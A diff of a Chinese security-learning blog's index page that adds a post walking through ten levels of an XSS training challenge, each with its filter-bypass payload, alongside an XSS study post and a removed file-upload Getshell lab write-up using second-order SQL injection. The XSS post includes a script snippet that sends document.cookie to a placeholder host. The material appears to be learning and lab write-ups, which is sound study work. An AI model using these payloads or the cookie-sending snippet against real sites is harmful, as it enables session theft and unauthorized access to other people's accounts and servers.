@@ -41,9 +41,9 @@
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>16</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>17</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
-      <a href="/tags"><div><strong>7</strong><br>标签</div></a>
+      <a href="/tags"><div><strong>8</strong><br>标签</div></a>
     </div>
     <ul class="blog-link">
      
@@ -68,6 +68,80 @@
 </div>
 
         <section id="main">
+  
+    <article id="post-xss挑战赛的Payload(上)" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/06/04/xss挑战赛的Payload(上)/" class="article-date">
+  <time class="post-time" datetime="2018-06-04T11:02:27.000Z" itemprop="datePublished">
+    <span class="post-month">6月</span><br/>
+    <span class="post-day">04</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/04/xss挑战赛的Payload(上)/">xss挑战赛的Payload(上)</a>
+    </h1>
+  
+
+        <div>
+          
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
+  </div>
+
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>日常开头，塔主在之前弄了一个XSS的专题，里面大致介绍了XSS攻击的一些要领以及给了我们一个XSS训练平台。里面有共计21道题目，所以我打算归纳一下Payload，随便总结一下bypass的思路。  </p>
+<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><img src="../images/14/1.png" alt=""><br>打开XSS挑战赛的地址，发现第一题很明显是Get型的传参方式。试试最为基础的，也是作为测试的Payload。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>很容易过关跳转到第二关。</p>
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>审查元素<br><img src="../images/14/2.png" alt=""><br>发现输入的字符被嵌入进了<strong>value=””</strong>，可以考虑闭合构造弹出提示框，然后注释掉后面的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; //</span><br></pre></td></tr></table></figure></p>
+<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>测试一下发现在文本框输入<strong>‘</strong>是无法回显的，审查元素发现如下。<br><img src="../images/14/3.png" alt=""><br>针对这个为啥输入了一个’，源码就变成这样我还特地问了问前端狗大黄，这可能是浏览器的问题。我特地试试了几个不同的浏览器，发现输入相同，但是网站的源码并不一致，所以为了学好XSS，我就一直用一个特定的浏览器firefox。<br>接着测试一下’a’b确定输入的内容如何嵌入网站源码。<br><img src="../images/14/4.png" alt=""><br>那就照猫画虎构造Payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;onclick=alert(1)&gt;&apos;</span><br></pre></td></tr></table></figure>
+<p>源码就变为了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onclick=&quot;alert(1)&gt;&apos;&apos;&quot;</span><br></pre></td></tr></table></figure>
+<p>这里由于浏览器解析问题这一段就直接解析成了一个事件，点击一下文本框就弹窗了。<br><strong>PS:具体原理我也搞不懂是为啥，问了前端狗也无果</strong></p>
+<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>这一题和上一题类似，就是把<strong>‘</strong>换成了<strong>“</strong>，试着输入Payload。<br><img src="../images/14/5.png" alt=""><br>发现回显出现了一个问题就是<strong>&gt;</strong>被吞了，既然这样我们可以试试实体编码<strong>&amp;gt</strong>来绕过。<br>点击文本框即可弹窗。  </p>
+<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>这题目多了一个难点就是on被强制转化为了o_n，就说明某些事件标签就不可以用了，但是可以换一个思路来构造xss的Payload，既然on不能用了，那我们试试a，href标签，构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;clickme&lt;&quot;</span><br></pre></td></tr></table></figure></p>
+<p><img src="../images/14/6.png" alt=""><br>发现a标签被解析了，只要点击后面的clickme就能执行javascript伪协议后面的内容。</p>
+<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>这一关相比较第五关就是过滤了href，目前过滤了on，script，href这三个关键词，我们可以尝试使用大小写来进行绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;sCript&gt;alert(1)&lt;/sCript&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></p>
+<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>这题目初步测试发现关键词on，script，src，href等关键词都被过滤了，无法回显我们输入的关键词，那么可以试试双写来绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></p>
+<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>这一题过滤了很多东西，大写被自动转义成了小写，一些关键词中间都被强加了<strong>_</strong>，我们可以推测前端获取了信息返回给后端，后端是经过了一定处理的，所以呢，我们只要避开后端的检测就行了，这里可以使用实体编码来绕过，因为在后端是无法解析实体编码的，只有在前端页面才能进行解析，所以我们可以用实体编码来构造payload。<br>解决这个问题，再次观察题目发现我们输入的payload会被网页添加到<strong>a href</strong>标签中，所以我们最后的payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure></p>
+<p><img src="../images/14/7.png" alt=""></p>
+<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>说实话一开始我毫无头绪，测试了很多发现都无法改变友链的内容，知道看到解析才知道，原来合法链接的意思是要加上<strong>http://</strong>，这样就好构造了，把后面的<strong>http://</strong>注释掉就行了，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)//http://</span><br></pre></td></tr></table></figure></p>
+<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>点进去发现什么都没给,但查看源码发现<br><img src="../images/14/8.png" alt=""><br>输入框被隐藏了，所以可以直接通过get把参数传过去，不过在测试的时候发现只有<strong>t_sort</strong>这个参数传过去才能更改源码。<br>不过测试发现<strong>&lt;&gt;</strong>这个标签被过滤了，并且我在尝试使用<strong>&amp;lt,&amp;gt</strong>绕过时发现，不仅左右括号被吞了，连内容也被吞了，不过好在on有用，构造如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://daka.whaledu.com/xss/level10.php?t_sort=&quot; type=&quot;button&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure></p>
+<p>最终的解析为<br><img src="../images/14/9.png" alt=""></p>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>由于考试周加上一些烦躁的事情要处理，博客没来得及更新，接下来博客会很勤的写。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/06/04/xss挑战赛的Payload(上)/" data-id="cjjgkpwhw000xz8ve3g92narx" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
   
     <article id="post-关于xss的一些学习心得" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -109,14 +183,14 @@
 <h2 id="何为XSS"><a href="#何为XSS" class="headerlink" title="何为XSS"></a>何为XSS</h2><p>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。<strong>(摘自百度百科)</strong><br>以上的说明呢，是官方的。不过根据我的理解来说，XSS攻击是攻击者把构造的恶意代码插入到网页源码中，通过跳转，执行事件等方式来达到获取信息，执行恶意代码等目的。  </p>
 <h2 id="XSS攻击的分类"><a href="#XSS攻击的分类" class="headerlink" title="XSS攻击的分类"></a>XSS攻击的分类</h2><p>一般来说XSS攻击分为三种。<br>第一种是反射型XSS，反射性XSS只是简单地把用户输入的数据”反射”给浏览器，也就是说攻击者必须让攻击点击所构造的恶意链接才能给攻击者反馈消息或者执行非本人意愿的命令。这一种反馈是即时性的，也是一次性的，也就是即输即用，也叫做”非持久型XSS”<br>第二种是储存型XSS，储存型XSS会把攻击者所构造的恶意代码储存到后端的数据库中，只要有用户一旦浏览到恶意代码的页面便会执行攻击的代码，被窃取登入验证等信息，攻击者便可以假冒”代表”用户进行操作。<br>第三种是基于Dom的XSS，这一种XSS攻击和反射型差不多，也算是反射型的一种，这种类型的攻击一般是攻击者构造一些事件，或者调用js里面一些函数来实现的，所以具体来说这种和第一种区分不算太大。  </p>
 <h2 id="XSS一些Payload"><a href="#XSS一些Payload" class="headerlink" title="XSS一些Payload"></a>XSS一些Payload</h2><p>其实来说呢，xss的payload也不是类似sql注入一样固定的，xss的payload一般来说是变化多样，根据其html的代码来进行构造的。<br>这是最为基础，也是常用于测试的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">```  </span><br><span class="line">这里面包含了标签，也包含了alert()函数，一般来说是可以测试出一些东西的。  </span><br><span class="line">还有例如这种的payload</span><br></pre></td></tr></table></figure></p>
-<p><img scr="#" onerror="alert(1)"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这种是通过构造一个错误，触发onerror事件弹出alert(1)。  </span><br><span class="line">还有类似这种</span><br></pre></td></tr></table></figure></p>
+<p><img scr="#" onerror="alert(1)"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这种是通过构造一个错误，触发onerror事件弹出alert(1)。   </span><br><span class="line">还有类似这种</span><br></pre></td></tr></table></figure></p>
 <p><script><br>var i=new Image;<br>i.src=”<a href="http://xxxx.xxxx.xxx&quot;+document.cookies">http://xxxx.xxxx.xxx&quot;+document.cookies</a>;<br></script><br><code>`</code><br>这种就是通过点击恶意链接，然后用户的信息就被窃取了。<br><strong>以上只是几种简单的Payload，其余的类型实在是太过复杂了，多做题目才能有更多的经验</strong>  </p>
 <h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>这个就大致说一下吧，之后会在练习中讲解一些的。主要分为以下几种。<br><strong>1 编码绕过</strong>根据网页过滤的代码，以及代码执行的环境进行合适的编码转化，例如他在后台过滤<strong>&lt;&gt;</strong>这个东西，那我们可以通过%3c%3e来绕过，也可以\0x3c来绕过。<br><strong>2 字符限制</strong>一般网页会限制输入的长度，我们可以进行简化代码，也可以直接更改源码中的maxlength要素来修改字符长度上限。<br><strong>3 使用标签</strong>灵活使用标签也是可以达到同样的效果的。<br>一些其他的方式也是需要在实战中进行磨练出来的，之后会写一篇XSS练习平台的wp，详细说一些思路。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/06/01/关于xss的一些学习心得/" data-id="cjhvwx83q001028vea6qs261f" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/06/01/关于xss的一些学习心得/" data-id="cjjgkpwir0013z8veyixe131q" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-XSS/">Web XSS</a></li></ul>
@@ -201,7 +275,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/25/ISCC之Web的一些wp/" data-id="cjhvwx834000l28veeatdficm" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/25/ISCC之Web的一些wp/" data-id="cjjgkpwg4000ez8vee5ty5346" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -260,7 +334,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/23/order by和group by在sql注入中的妙用/" data-id="cjhvwx839000o28veq0ssj30r" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/23/order by和group by在sql注入中的妙用/" data-id="cjjgkpwe7000az8ve0m3odgyh" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
@@ -417,7 +491,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/17/入侵后台的一次尝试/" data-id="cjhvwx83y001428vekz54zixx" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/17/入侵后台的一次尝试/" data-id="cjjgkpwhw000vz8velvyly21n" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -480,7 +554,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/07/CBC字节反转攻击/" data-id="cjhvwx82s000f28veembhk6su" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/07/CBC字节反转攻击/" data-id="cjjgkpwgq000kz8vepbrf4kpt" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -545,7 +619,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/01/sql注入之报错注入/" data-id="cjhvwx83m000y28ve2n87uujt" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/01/sql注入之报错注入/" data-id="cjjgkpwhd000sz8vefxkhe5xa" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -603,7 +677,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/30/sql注入之时间盲注/" data-id="cjhvwx83i000v28veag98tmbh" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/30/sql注入之时间盲注/" data-id="cjjgkpwg5000fz8vely8ate6t" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -674,7 +748,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/29/sql注入之布尔型注入/" data-id="cjhvwx83f000s28vesvh6in4w" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/29/sql注入之布尔型注入/" data-id="cjjgkpwgx000mz8veyjhbzw4d" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -771,69 +845,10 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/21/关于sql注入的一些学习心得/" data-id="cjhvwx83u001228veq0syoesl" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/21/关于sql注入的一些学习心得/" data-id="cjjgkpwj70015z8vehughgdo4" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-初试Getshell" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/04/11/初试Getshell/" class="article-date">
-  <time class="post-time" datetime="2018-04-11T14:13:44.000Z" itemprop="datePublished">
-    <span class="post-month">4月</span><br/>
-    <span class="post-day">11</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/11/初试Getshell/">初试Getshell</a>
-    </h1>
-  
-
-        <div>
-          
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
-  </div>
-
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="文件管理系统"><a href="#文件管理系统" class="headerlink" title="文件管理系统"></a>文件管理系统</h3><p>在很久很久以前就想日站了，奈何自己的动力不足，一拖再拖导致现在的水平和其他人差距拉开太大了，不过庆幸的是在塔主的带领下，终于开始踏入了神秘的Getshell领域了。Getshell主要的手段就是上传文件，里面的文件需要具备这几个特点:<img src="../images/6/8.png" alt="">。根据塔主的提示，一般文件上传漏洞的思路如下：<img src="../images/6/6.png" alt="">  <img src="../images/6/7.png" alt="">要深入理解也只能实际操作才能得到效果。<br>第一天的网站:<a href="http://202.98.28.108:10014/2sdrewe4543sd/" target="_blank" rel="noopener">http://202.98.28.108:10014/2sdrewe4543sd/</a><br>在给了网站的同时，网站的源码也给了出来。这个就有点白盒审计的味道了。然后还给了一个hint，flag在SERVER_ADMIN下，也就是说我们传上一个包含phpinfo()函数的php文件然后让服务器解析执行就能得到flag了。<br>首先打开网址<img src="../images/6/1.png" alt="">毕竟是个给我们做题的网站，所以自然是有点简陋的了。观察网站发现有这么几个功能。<br><img src="../images/6/2.png" alt="">第一个是上传文件的功能，根据提示应该是只能上传图片文件，也就是说后缀名只能是jpg,png等等。的确在后面代码审计upload.php的时候发现了这个网站通过白名单验证限制了用户上传文件的类型<br><img src="../images/6/3.png" alt=""><br>接着看看rename的功能<br><img src="../images/6/4.png" alt=""><br>给出两个文本框一个要更名的文件名，一个更名后新的文件名，值得注意的是这里只是单纯的更改前面的文件名而已，并不能更改文件的后缀名，也就是说我们没办法通过把1.txt改成1.php来绕过Getshell。另一个删除功能并没有什么卵用，当然有用我也不会用。。。。<br>接下来查看源码看看用没有什么可以利用的东西。首先审计基础配置的文件—common.inc.php文件，<strong>一个主要的注意点</strong><img src="../images/6/5.png" alt="">由于加了addslashes()函数那么在参数方面注入是不太可能的（宽字节注入另当别论）所以可以考虑其他的方向。<br>审计一波主要的upload.php函数，发现有以下几个值得注意的地方<img src="../images/6/9.png" alt="">这里使用了白名单过滤，上面提过就不再提了，另外值得注意的地方是文件储存的方式，网站使用了两个数组来分别储存文件名和它所对应的后缀名。这就导致了我们无法通过00截断来绕过。而且这里也使用了addslashes()函数通过文件名来进行注入也是不可能的。<br>不过这个网站真的没用可以利用的地方了吗？这是不太可能的，接着往下看<img src="../images/6/10.png" alt="">这里是存在注入漏洞的，在更新插入的时候我们可以构造一个类似的语句来达到一些不可告人的目的。<br>接下来看看rename.php这个文件，这个文件是我们Getshell的关键<img src="../images/6/11.png" alt="">这里是从数据库中直接查询调用出来并没有经过什么过滤了，所以我们可以利用更新的语句进行二次注入。<img src="../images/6/12.png" alt="">这一段代码给我们提供了一个我们无法更改后缀名的信息，综合这以上的代码，可以分析出以下思路：<br>第一，我们需要上传一个php的文件让服务器解析，但是php的文件后缀名并不在白名单里面，所以问题简化为如何绕过过滤来达到我们想要的效果。<br>所以，我们需要使得我们一开始上传的图片类型文件更改为.php的文件，但是在更名文件里面，文件名和后缀名分开独立，我们无法达到更改后缀名的效果，那怎么办呢？其实还是有利用的地方的，还记得上面这个更新语句吗？<img src="../images/6/10.png" alt="">如果我们一开始上传的文件名是一个注入语句，那么我们是可以利用这一点把文件的后缀名更改为空的，然后更新文件名为我们的木马，那就可以通过后缀名为空来更改我们上传木马的后缀。<br>我们需要两个文件，一个文件的文件名是我们注入语句的文件名也就是<strong>‘,extension=’’,filename=’1000.jpg.jpg</strong>通过这个语句插进更新语句那就是这种效果:</p>
-<blockquote>
-<pre><code>update `file` set `filename`=&apos;1000.jpg&apos;, `oldname`=&apos;&apos;,extension=&apos;&apos;,filename=&apos;1000.jpg&apos; where `fid`={$result[&apos;fid&apos;]}  
-</code></pre><p>也就是说我们已经更新了数据库，有了一个1000.jpg.空的文件了，这样我们随意取一个名字，只要不和我们上传的重名例如250.jpg那就是说我们之前的文件上传为了250.jpg.jpg<br>那我们之前不是插入了一个1000.jpg.空的文件吗，这行代码有一点干扰<img src="../images/6/13.png" alt="">在查询的时候数据库需要一个1000.jpg的文件，也就是说我们需要再上传一个1000.jpg的文件，在这个文件里写入我们的phpinfo()函数，再通过rename功能把我们的1000.jpg.空改为1000.php.空，此时解析的就是1000.php也就是说成功解析了我们上传的shell文件，打开<a href="http://202.98.28.108:10014/2sdrewe4543sd/upload/1000.php" target="_blank" rel="noopener">http://202.98.28.108:10014/2sdrewe4543sd/upload/1000.php</a>就可以读出这个网站php的版本以及我们flag的信息了。<br>总体来说，这一次的Getshell让我学到了很多东西，一些基本的思路在之后会用挺大用处的，特别是一个bypass的思想，这个在之后做渗透测试的时候会很有帮助，希望能坚持下去，学习到更多的东西。</p>
-</blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/11/初试Getshell/" data-id="cjhvwx842001628veykrgpg92" class="article-share-link">分享</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-shell/">web shell</a></li></ul>
 
     </footer>
   </div>
@@ -888,9 +903,9 @@ while flag:
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>16</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>17</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
-      <a href="/tags"><div><strong>7</strong><br>标签</div></a>
+      <a href="/tags"><div><strong>8</strong><br>标签</div></a>
     </div>
 
 
